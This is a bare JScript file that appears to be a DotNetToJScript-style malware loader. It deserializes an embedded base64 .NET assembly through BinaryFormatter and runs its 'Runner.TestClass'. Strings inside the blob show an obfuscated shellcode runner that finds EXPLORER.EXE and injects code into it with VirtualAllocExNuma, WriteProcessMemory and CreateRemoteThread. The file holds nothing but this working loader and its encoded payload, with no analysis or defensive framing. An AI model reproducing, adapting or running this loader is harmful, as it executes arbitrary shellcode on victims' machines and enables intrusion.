function setversion() {
new ActiveXObject('WScript.Shell').Environment('Process')('COMPLUS_Version') = 'v4.0.30319';
}
function debug(s) {}
function base64ToStream(b) {
	var enc = new ActiveXObject("System.Text.ASCIIEncoding");
	var length = enc.GetByteCount_2(b);
	var ba = enc.GetBytes_4(b);
	var transform = new ActiveXObject("System.Security.Cryptography.FromBase64Transform");
	ba = transform.TransformFinalBlock(ba, 0, length);
	var ms = new ActiveXObject("System.IO.MemoryStream");
	ms.Write(ba, 0, (length / 4) * 3);
	ms.Position = 0;
	return ms;
}

var serialized_obj = "AAEAAAD/////AQAAAAAAAAAEAQAAACJTeXN0ZW0uRGVsZWdhdGVTZXJpYWxpemF0aW9uSG9sZGVy"+
"AwAAAAhEZWxlZ2F0ZQd0YXJnZXQwB21ldGhvZDADAwMwU3lzdGVtLkRlbGVnYXRlU2VyaWFsaXph"+
"dGlvbkhvbGRlcitEZWxlZ2F0ZUVudHJ5IlN5c3RlbS5EZWxlZ2F0ZVNlcmlhbGl6YXRpb25Ib2xk"+
"ZXIvU3lzdGVtLlJlZmxlY3Rpb24uTWVtYmVySW5mb1NlcmlhbGl6YXRpb25Ib2xkZXIJAgAAAAkD"+
"AAAACQQAAAAEAgAAADBTeXN0ZW0uRGVsZWdhdGVTZXJpYWxpemF0aW9uSG9sZGVyK0RlbGVnYXRl"+
"RW50cnkHAAAABHR5cGUIYXNzZW1ibHkGdGFyZ2V0EnRhcmdldFR5cGVBc3NlbWJseQ50YXJnZXRU"+
"eXBlTmFtZQptZXRob2ROYW1lDWRlbGVnYXRlRW50cnkBAQIBAQEDMFN5c3RlbS5EZWxlZ2F0ZVNl"+
"cmlhbGl6YXRpb25Ib2xkZXIrRGVsZWdhdGVFbnRyeQYFAAAAL1N5c3RlbS5SdW50aW1lLlJlbW90"+
"aW5nLk1lc3NhZ2luZy5IZWFkZXJIYW5kbGVyBgYAAABLbXNjb3JsaWIsIFZlcnNpb249NC4wLjAu"+
"MCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5BgcAAAAH"+
"dGFyZ2V0MAYIAAAAS21zY29ybGliLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwg"+
"UHVibGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4OQYJAAAAD1N5c3RlbS5EZWxlZ2F0ZQYKAAAA"+
"DUR5bmFtaWNJbnZva2UKBAMAAAAiU3lzdGVtLkRlbGVnYXRlU2VyaWFsaXphdGlvbkhvbGRlcgMA"+
"AAAIRGVsZWdhdGUHdGFyZ2V0MAdtZXRob2QwAwcDMFN5c3RlbS5EZWxlZ2F0ZVNlcmlhbGl6YXRp"+
"b25Ib2xkZXIrRGVsZWdhdGVFbnRyeQIvU3lzdGVtLlJlZmxlY3Rpb24uTWVtYmVySW5mb1Nlcmlh"+
"bGl6YXRpb25Ib2xkZXIJCwAAAAkMAAAACQ0AAAAEBAAAAC9TeXN0ZW0uUmVmbGVjdGlvbi5NZW1i"+
"ZXJJbmZvU2VyaWFsaXphdGlvbkhvbGRlcgcAAAAETmFtZQxBc3NlbWJseU5hbWUJQ2xhc3NOYW1l"+
"CVNpZ25hdHVyZQpTaWduYXR1cmUyCk1lbWJlclR5cGUQR2VuZXJpY0FyZ3VtZW50cwEBAQEBAAMI"+
"DVN5c3RlbS5UeXBlW10JCgAAAAYPAAAAS21zY29ybGliLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1"+
"cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4OQkJAAAABhEAAAAsU3lz"+
"dGVtLk9iamVjdCBEeW5hbWljSW52b2tlKFN5c3RlbS5PYmplY3RbXSkGEgAAACxTeXN0ZW0uT2Jq"+
"ZWN0IER5bmFtaWNJbnZva2UoU3lzdGVtLk9iamVjdFtdKQgAAAAKAQsAAAACAAAABhMAAAAgU3lz"+
"dGVtLlhtbC5TY2hlbWEuWG1sVmFsdWVHZXR0ZXIGFAAAAE1TeXN0ZW0uWG1sLCBWZXJzaW9uPTQu"+
"MC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4OQYV"+
"AAAAB3RhcmdldDAGFgAAAEttc2NvcmxpYiwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRy"+
"YWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODkGFwAAABpTeXN0ZW0uUmVmbGVjdGlv"+
"bi5Bc3NlbWJseQYYAAAABExvYWQKDwwAAAAAFgAAAk1akAADAAAABAAAAP//AAC4AAAAAAAAAEAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAIAAAAAOH7oOALQJzSG4AUzNIVRoaXMg"+
"cHJvZ3JhbSBjYW5ub3QgYmUgcnVuIGluIERPUyBtb2RlLg0NCiQAAAAAAAAAUEUAAEwBBAAAAAAA"+
"AAAAAAAAAADgAAIhCwEIAAAKAAAACAAAAAAAAG4pAAAAIAAAAEAAAAAAQAAAIAAAAAIAAAQAAAAA"+
"AAAABAAAAAAAAAAAoAAAAAQAAAAAAAADAECFAAAQAAAQAAAAABAAABAAAAAAAAAQAAAAAAAAAAAA"+
"AAAgKQAASwAAAABgAAAoAwAAAAAAAAAAAAAAAAAAAAAAAACAAAAMAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACAAAAgAAAAAAAAAAAAAAAggAABIAAAA"+
"AAAAAAAAAAAudGV4dAAAAHQJAAAAIAAAAAoAAAAEAAAAAAAAAAAAAAAAAAAgAABgLnNkYXRhAAAA"+
"AgAAAEAAAAACAAAADgAAAAAAAAAAAAAAAAAAQAAAwC5yc3JjAAAAKAMAAABgAAAABAAAABAAAAAA"+
"AAAAAAAAAAAAAEAAAEAucmVsb2MAAAwAAAAAgAAAAAIAAAAUAAAAAAAAAAAAAAAAAABAAABCAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABQKQAAAAAAAEgAAAACAAUAcCEAAKgHAAABAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAB4CKAkA"+
"AAoqEzAHAO8AAAABAAARKAIAAAoKIIgTAAAoBgAABigCAAAKDBICBigDAAAKDRIDKAQAAAoLByMA"+
"AAAAAAD4P0EBAAAAKiD+AQAAjQQAAAEl0AEAAAQoBQAAChMEF40EAAABJRYgoAAAAJwTBRYTBjgW"+
"AAAAEQQRBhEFFpERBBEGkWHSnBEGF1gTBhEGEQSOaT/f////IP8PHwAWcgEAAHAoBgAAChaabwcA"+
"AAooAgAABhMHEQd+CAAACiAAEAAAIAAwAAAfQBYoAwAABhMIEQcRCBEEEQSOaRIJKAQAAAYmEQd+"+
"CAAAChYRCH4IAAAKFn4IAAAKKAUAAAYTCioAEzABAA0AAAACAAARcwEAAAYKBm8IAAAGKgAAAEJT"+
"SkIBAAEAAAAAAAwAAAB2NC4wLjMwMzE5AAAAAAUAbAAAAMwCAAAjfgAAOAMAAJADAAAjU3RyaW5n"+
"cwAAAADIBgAAHAAAACNVUwDkBgAAEAAAACNHVUlEAAAA9AYAALQAAAAjQmxvYgAAAAAAAAACAAAQ"+
"V5UCNAkCAAAA+gEzABYAAAEAAAANAAAABAAAAAEAAAAJAAAAFgAAAAsAAAADAAAAAQAAAAIAAAAB"+
"AAAABgAAAAEAAAABAAAAAgAAAAEAAAAAAHIDAQAAAAAABgAbAC8ABgC/AcgBBgDgAcgBBgD6AcgB"+
"BgBdAmwCBgCcAsgBBgCiAsgBCgC1Ar0CBgDqAsgBBgD2AsgBBgD9AmwCBgAnA8gBBgBLA2wCAAAA"+
"AAEAAAAAAAEAAQABABAAEQAKACkAAQABAIABEAD/AQAAKQABAAoACwEQAB4CAAAxAAIACgAzAS0C"+
"HABQIAAAAACGGE4ANgABAAAAAACAAJEgVAA/AAEAAAAAAIAAkSCUAEYABAAAAAAAgACRIOkAUAAK"+
"AAAAAACAAJEgMAFbAA8AAAAAAIAAkSCYAWYAFgAAAAAAgACRIK0BawAXAFggAAAAAIYAGAM2ABcA"+
"VCEAAAAAlgAiA4IAFwAAAAEAbQAAAAIAewAAAAMAigAAAAEApwAAAAIAsAAAAAMAugAAAAQAwQAA"+
"AAUA0gAAAAYA3AAAAAEApwAAAAIA/AAAAAMACgEAAAQAEwECAAUAGQEAAAEApwAAAAIAQwEAAAMA"+
"VgEAAAQAYgEAAAUAcQEAAAYAfQEAAAcAjQEAAAEAngEJAE4AAQARAM8BDAARANcBEQAZAOkBGAAp"+
"AIwCIABBANACKABBAOMCLwBJAPECMwBRAE4ANgBZAE4ANgBpAE4ANgAuAFsAiwBDAAsABgBjAFMA"+
"OgABAAACAAAEAG8AhgBgAEEBBQBUAAEAQQEHAJQAAQAAAQkA6QABAAABCwAwAQEAAAENAJgBAQAA"+
"AQ8ArQEBAABAAAABAASAAAAAAAAAAAAAAAAAAAAAADEDAAAEAAAAAAAAAAAAAACqAGkDAAAAAAQA"+
"AAAAAAAAAAAAAKoAyAEAAAAABAADAAAAADxNb2R1bGU+AFJ1bm5lcgBUZXN0Q2xhc3MAQ29tVmlz"+
"aWJsZUF0dHJpYnV0ZQBTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMALmN0b3IAT3BlblBy"+
"b2Nlc3MAa2VybmVsMzIuZGxsAHByb2Nlc3NBY2Nlc3MAYkluaGVyaXRIYW5kbGUAcHJvY2Vzc0lk"+
"AFZpcnR1YWxBbGxvY0V4TnVtYQBoUHJvY2VzcwBscEFkZHJlc3MAZHdTaXplAGZsQWxsb2NhdGlv"+
"blR5cGUAZmxQcm90ZWN0AG5uZFByZWZlcnJlZABXcml0ZVByb2Nlc3NNZW1vcnkAbHBCYXNlQWRk"+
"cmVzcwBscEJ1ZmZlcgBuU2l6ZQBscE51bWJlck9mQnl0ZXNXcml0dGVuAENyZWF0ZVJlbW90ZVRo"+
"cmVhZABscFRocmVhZEF0dHJpYnV0ZXMAZHdTdGFja1NpemUAbHBTdGFydEFkZHJlc3MAbHBQYXJh"+
"bWV0ZXIAZHdDcmVhdGlvbkZsYWdzAGxwVGhyZWFkSWQAU2xlZXAAZHdNaWxsaXNlY29uZHMAR2V0"+
"Q3VycmVudFByb2Nlc3MARGF0ZVRpbWUAU3lzdGVtAGdldF9Ob3cAU3VidHJhY3QAVGltZVNwYW4A"+
"Z2V0X1RvdGFsU2Vjb25kcwBCeXRlADxQcml2YXRlSW1wbGVtZW50YXRpb25EZXRhaWxzPgAkQXJy"+
"YXlUeXBlPTUxMgAkZmllbGQtMDRBOEREODYyODJCMUVENTIwQTA2QTNCNENCMTE1MjBGNTZGQTM0"+
"RABSdW50aW1lSGVscGVycwBTeXN0ZW0uUnVudGltZS5Db21waWxlclNlcnZpY2VzAEluaXRpYWxp"+
"emVBcnJheQBBcnJheQBSdW50aW1lRmllbGRIYW5kbGUAUHJvY2VzcwBTeXN0ZW0uRGlhZ25vc3Rp"+
"Y3MAR2V0UHJvY2Vzc2VzQnlOYW1lAGdldF9JZABJbnRQdHIAWmVybwBPYmplY3QAQ29tcGlsZXJH"+
"ZW5lcmF0ZWRBdHRyaWJ1dGUAU2hlbGxjb2RlAE1haW4AVmFsdWVUeXBlAHNoZWxsY29kZV9ydW5u"+
"ZXJfYXNzZW1ibHkAUnVudGltZUNvbXBhdGliaWxpdHlBdHRyaWJ1dGUAbXNjb3JsaWIAc2hlbGxj"+
"b2RlX3J1bm5lcl9hc3NlbWJseS5kbGwAABlFAFgAUABMAE8AUgBFAFIALgBFAFgARQAAAPOvujNU"+
"2yJMjZr8M1mE2yEABCABAQIFAQABAAAEAAARCQYgARENEQkDIAANAwYREAcAAgESGREdBgABHRIh"+
"DgMgAAgCBhgDIAABBAEAAAAGAAMYCQIICQAGGBgYCQkJCQoABQIYGB0FCBAYCgAHGBgYCRgYCRgE"+
"AAEBCQMAABgSBwsRCQ0RCRENHQUdBQgYGBgYAwAAAQQHARIIHgEAAQBUAhZXcmFwTm9uRXhjZXB0"+
"aW9uVGhyb3dzAQi3elxWGTTgiQAAAAAAAAAAAEgpAAAAAAAAAAAAAF4pAAAAIAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAABQKQAAAAAAAAAAX0NvckRsbE1haW4AbXNjb3JlZS5kbGwAAAAAAP8lACBAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAXOgjRFBIbKCgoOHx4fDy6JFy8cXoK/LA6CvyuPboK/KA"+
"6K8X6uroK9Lw7ZFp6JFgDJzB3KKMgOFhaa3hoWFCTfLh8egr8oAr4pzooXDGIdi4q6KvJdKgoKAr"+
"ICigoKDoJWDUx+ihcOQr4IDpoXAr6LjwQ/boX2ntkWnhK5Qo6KF26JFg4WFprQzhoWGYQNVR7KPs"+
"hKjlmXHVePjkK+CE6aFwxuErrOjkK+C86aFw4SukKOihcOH44fj++frh+OH54froI0yA4fJfQPjh"+
"+froK7JJ619fX/3pHtfTkv+TkqCg4fbpKUboIUwAoaCg6SlF6RyioKEbYAjEIOH06SlE7ClR4Rrs"+
"14anX3XsKUrIoaGgoPnhGokgy6Bfdcqq4f7w8O2Rae2RYOhfYOgpYuhfYOgpYeEaSq9/QF916Cln"+
"yrDh+OwpQugpWeEaOQXUwV91JWDUqulfbtVFSDOgoKDoI0yw6ClC7ZFpyqTh+OgpWeEaonlo/191"+
"I1ig3vXoI2SA/ilWyuDh+cigsKCg4fjoKVLokWnhGvgE80VfdegpY+kpZ+2RaekpUOgpeugpWeEa"+
"onlo/191I1ig3Yj44ff5yKDgoKDh+Mqg+uEaq4+vkF919/nhGtXO7cFfdelfbkmcX19f6KFj6Ilm"+
"6CVW1RThX0f4yqD56WdiUBUC9l91AAAAAAAAAAAAAAAAAAAAAAEAEAAAABgAAIAAAAAAAAAAAAAA"+
"AAAAAAEAAQAAADAAAIAAAAAAAAAAAAAAAAAAAAEAAAAAAEgAAABYYAAA0AIAAAAAAAAAAAAA0AI0"+
"AAAAVgBTAF8AVgBFAFIAUwBJAE8ATgBfAEkATgBGAE8AAAAAAL0E7/4AAAEAAAAAAAAAAAAAAAAA"+
"AAAAAD8AAAAAAAAABAAAAAIAAAAAAAAAAAAAAAAAAABEAAAAAQBWAGEAcgBGAGkAbABlAEkAbgBm"+
"AG8AAAAAACQABAAAAFQAcgBhAG4AcwBsAGEAdABpAG8AbgAAAAAAfwCwBDACAAABAFMAdAByAGkA"+
"bgBnAEYAaQBsAGUASQBuAGYAbwAAAAwCAAABADAAMAA3AGYAMAA0AGIAMAAAABwAAgABAEMAbwBt"+
"AG0AZQBuAHQAcwAAACAAAAAkAAIAAQBDAG8AbQBwAGEAbgB5AE4AYQBtAGUAAAAAACAAAAAsAAIA"+
"AQBGAGkAbABlAEQAZQBzAGMAcgBpAHAAdABpAG8AbgAAAAAAIAAAADAACAABAEYAaQBsAGUAVgBl"+
"AHIAcwBpAG8AbgAAAAAAMAAuADAALgAwAC4AMAAAAFQAGgABAEkAbgB0AGUAcgBuAGEAbABOAGEA"+
"bQBlAAAAcwBoAGUAbABsAGMAbwBkAGUAXwByAHUAbgBuAGUAcgBfAGEAcwBzAGUAbQBiAGwAeQAA"+
"ACgAAgABAEwAZQBnAGEAbABDAG8AcAB5AHIAaQBnAGgAdAAAACAAAAAsAAIAAQBMAGUAZwBhAGwA"+
"VAByAGEAZABlAG0AYQByAGsAcwAAAAAAIAAAAGQAHgABAE8AcgBpAGcAaQBuAGEAbABGAGkAbABl"+
"AG4AYQBtAGUAAABzAGgAZQBsAGwAYwBvAGQAZQBfAHIAdQBuAG4AZQByAF8AYQBzAHMAZQBtAGIA"+
"bAB5AC4AZABsAGwAAAAkAAIAAQBQAHIAbwBkAHUAYwB0AE4AYQBtAGUAAAAAACAAAAAoAAIAAQBQ"+
"AHIAbwBkAHUAYwB0AFYAZQByAHMAaQBvAG4AAAAgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAACAAAAwAAABwOQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+
"AAAAAAAAAAAAAAAAAAAAAAAAAAABDQAAAAQAAAAJGAAAAAYZAAAAS21zY29ybGliLCBWZXJzaW9u"+
"PTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4"+
"OQkXAAAABhsAAAAnU3lzdGVtLlJlZmxlY3Rpb24uQXNzZW1ibHkgTG9hZChCeXRlW10pBhwAAAAu"+
"U3lzdGVtLlJlZmxlY3Rpb24uQXNzZW1ibHkgTG9hZChTeXN0ZW0uQnl0ZVtdKQgAAAAKCwAA";
var entry_class = 'Runner.TestClass';

try {
	setversion();
	var stm = base64ToStream(serialized_obj);
	var fmt = new ActiveXObject('System.Runtime.Serialization.Formatters.Binary.BinaryFormatter');
	var al = new ActiveXObject('System.Collections.ArrayList');
	var d = fmt.Deserialize_2(stm);
	al.Add(undefined);
	var o = d.DynamicInvoke(al.ToArray()).CreateInstance(entry_class);
	
} catch (e) {
    debug(e.message);
}